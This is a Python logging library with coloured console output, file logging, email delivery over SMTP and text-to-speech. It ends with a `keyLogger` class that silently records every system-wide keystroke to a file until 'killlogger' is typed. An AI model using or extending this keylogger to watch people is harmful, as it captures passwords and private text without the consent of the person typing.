#!/usr/bin/python
# -*- coding: utf-8 -*-

'''
Logger Python Project prology. Made to easily print
information of various kinds and is able to traceback bugs
and function trees.
'''

# built-in dependencies
import os, inspect, sys
from traceback import format_exc, print_exc
from datetime import datetime
from time import sleep, time
import smtplib
# external dependencies
import pynput
from pynput.keyboard import Listener, Key
import pyttsx3

class logger:

    def __init__(self, filepath=None, overwrite=False):

        #---- paramteters ----#
        self.filepath = filepath
        if overwrite:
            with open(filepath, 'w+') as f:
                pass
        self.overwrite = overwrite
        #---------------------#

        #---- type colors ----#
        self.HEADER = '\033[95m'
        self.OKBLUE = '\033[94m'
        self.OKGREEN = '\033[92m'
        self.WARNING = '\033[93m'
        self.FAIL = '\033[91m'
        self.ENDC = '\033[0m'
        self.BOLD = '\033[1m'
        self.UNDERLINE = '\033[4m'
        #---------------------#

        #---- speaking service ----#
        self.rate = 0.5
        try:
            self.engine = pyttsx3.init()
            self.voices = self.engine.getProperty('voices')
            self.engine.setProperty('voice', "english")
            self.engine.setProperty('rate', int(self.rate*200))
        except OSError:
            print(f'[{self.WARNING}warning{self.ENDC}]: failed loading pyttsx3. No espeak installed on your system\nTry to install espeak using {self.WARNING}sudo apt-get update && sudo apt-get install espeak{self.ENDC}')
        #--------------------------#

        # initialize mail service in disabled state
        self.mailService = False

    def email(self, address, password, contacts, smtpServer=None, port=587):

        if '@' not in address:

            raise ValueError('address is not email conform.')

        self.mailService = True
        self.address = address
        self.password = password
        if type(contacts) != dict or contacts == {}:
            raise ValueError('contacts must be provided as dict e.g. {name : mail@provider.com}')
        self.contacts = contacts
        if smtpServer != None:
            self.smtpServer = smtpServer
        else:
            self.smtpServer = 'smtp.' + self.address.split('@')[-1]
        self.port = port

    def note(self, input='', inputCol=None, logType='info', logTypeCol=None, showExcept=True, timestamp=True, fTree=False, 
            benchMark=None, detatch=False, save=True, deliverTo=None, subject=None, wait=None,
            forward=True, forwardBlock=False, speak=False):

        # begin new block and ColorBlock
        block = ''
        blockCol = ''

        # decide on logType
        if logType != None:

            block += f'[{logType}]'

            if logTypeCol != None: # if color provided

                blockCol += '[' + f'{logTypeCol}' + f'{logType}' + self.ENDC + ']'
            
            else:

                if logType.lower() == 'warn':

                    blockCol += '[' + self.WARNING + f'{logType}' + self.ENDC + ']'
                
                elif logType.lower() == 'error':

                    blockCol += '[' + self.FAIL + f'{logType}' + self.ENDC + ']'

                elif logType.lower() == 'info':

                    blockCol += '[' + self.OKGREEN + f'{logType}' + self.ENDC + ']'
                
        # decide on timestamp
        if timestamp:

            dt = datetime.now().strftime("%d.%m.%y %H:%M:%S")
            block += f"[{dt}]"
            blockCol += f"[{dt}]"
        
        # decide on fTree
        if fTree:

            tree = '[call tree: '
            try:

                grandparent = f'{inspect.stack()[3][3]} > '
            except:
                grandparent = ''
            try:
                parent = f'{inspect.stack()[2][3]} > '
            except:
                parent = ''
            try:
                caller = f'{inspect.stack()[1][3]} > '
            except:
                caller = ''

            tree += grandparent + parent + caller + f'{logType}]'
            block +=  tree
            blockCol += tree

        # benchmark test
        if benchMark != None:

            try:

                # estimate the error
                start = time()
                stop = time()
                inaccuracy = stop - start

                start = time()
                benchMark()
                stop = time()

            except Exception as e:
                raise ValueError("Error occured:", e)

            benchMarkResult = (stop - start - inaccuracy) * 1000.
            if benchMarkResult > 1000:
                benchMarkResult /= 1000 # display rather in seconds
                unit = 's'
            else:
                unit = 'ms'
            
            block += f'[benchmark: {benchMarkResult} {unit}]'
            blockCol += f'[benchmark: {benchMarkResult} {unit}]'

        # decide on wether to put :
        if logType != None or fTree or timestamp:

            block += ': '
            blockCol += ': '

        # append the input finally
        block += f'{input}'
        if inputCol != None:
            blockCol += inputCol + f'{input}' + self.ENDC
        else:
            blockCol += f'{input}'
        
        # append to file
        if save and self.filepath != None:

            with open(self.filepath, 'a') as f:
                f.write(block + '\n')

        # append error message
        if logType == 'error':

            if showExcept:
                try:
                    e = format_exc().replace('\n','\n\t')
                    block += '\n\t{}'.format(e)
                except:
                    pass

            if logTypeCol != None:

                blockCol += logTypeCol + '\n\t{}'.format(e) + self.ENDC

            else:

                blockCol += self.FAIL + '\n\t{}'.format(e) + self.ENDC

        # check for mailing
        if deliverTo != None:

            if self.mailService:

                if subject == None:

                    subject = 'Note Delivery: FYI'
                
                if deliverTo.lower() == 'all':

                    mailSet = list(self.contacts.values())

                else:

                    if type(deliverTo) is list:

                        mailSet = [self.contacts[name] for name in deliverTo]
                    
                    else:

                        mailSet = [self.contacts[deliverTo]]

                try:    
                    
                    with smtplib.SMTP(self.smtpServer, self.port) as server:
                        
                        server.starttls() 
                        server.login(self.address, self.password)
                        
                        for mail in mailSet:

                            mailForm = '''From: {}\nTo: {}\nSubject: {}\n\n{}'''.format(self.address, mail, subject, block)
                            server.sendmail(self.address, mail, mailForm)

                    # insert mail status into printed block
                    blockList = block.split(']: ')
                    blockColList = blockCol.split(']: ')
                    block = blockList[0] + ']' + '[mail: sent.]: ' + blockList[1]  
                    blockCol = blockColList[0] + ']' + '[mail: sent.]: ' + blockColList[1]       
                
                except Exception as e:

                    blockList = block.split(']: ')
                    blockColList = blockCol.split(']: ')
                    block = blockList[0] + ']' + '[mail: error]: ' + blockList[1] 
                    blockCol =  blockColList[0] + ']' + '[mail: error]: ' + blockColList[1] 
                    print('[Error]: during delivery:', e)
                    print_exc()

            else:

                print("[warning]: No mail defined. Run logger.mail(args) ..")

        # if not to log into console
        if not detatch:

            print(blockCol)

        # wait
        if wait != None:
            sleep(int(wait))

        try:    # async work-around :)
            # forward
            if forward:

                if forwardBlock:

                    return block
                
                else:

                    return input

        finally: # everything here will come after the return of the function

            # speaking
            if speak:

                try:

                    self.engine.say(input)
                    self.engine.runAndWait()

                except:

                    print_exc()


class keyLogger(logger):

    def __init__(self, **kwargs):

        logger.__init__(self, **kwargs)
        if self.filepath == None:
            self.filepath = './log.txt'

    def start(self):

        '''
        After running this method the logger will start either silently or 
        in a console. To break the logger you must type "killlogger" 
        in any environment.
        '''

        self.keys = [] 
   
        def on_press(key): 

            # removing '' 
            k = str(key).replace("'", "") 
            self.note(k, detatch=True, fTree=False)
            
            self.keys.append(k)
            self.keys = self.keys[-30:] 
            
            if "killlogger" in ''.join(self.keys):
                exit(0)
                
        with Listener(on_press = on_press) as listener: 
                            
            listener.join()

if __name__ == '__main__':

    pass
